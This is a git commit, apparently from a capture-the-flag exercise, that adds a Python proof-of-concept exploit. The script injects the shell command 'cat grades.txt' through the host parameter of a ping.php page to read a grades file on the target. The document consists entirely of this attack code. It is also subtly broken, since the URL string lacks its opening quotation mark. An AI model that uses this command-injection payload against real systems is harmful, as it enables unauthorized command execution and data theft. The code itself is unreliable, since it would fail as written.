68acc23ec2e4099a2dbba27c370e444fd7a049fb
ayoungYoon <166527083+ayoungYoon@users.noreply.github.com>
2025-08-19 07:02:30 +0900

    Update POC.py

--- Professor's computer/POC/POC.py
+++ Professor's computer/POC/POC.py
@@ -1,1 +1,24 @@
+import requests
+
+def exploit():
+    url = http://xksw-ctf.kuality.kr/ping.php"
+    payload = "127.0.0.1;cat grades.txt 1337"
+
+  
+    target = f"{url}?host={payload}"
+    print(f"[+] Sending exploit to: {target}")
+
+    try:
+        r = requests.get(target, timeout=5)
+
+        print("Response:")
+        print(r.text)
+
+    except Exception as e:
+        print(f"Error: {e}")
+
+
+if __name__ == "__main__":
+    exploit()
+
 
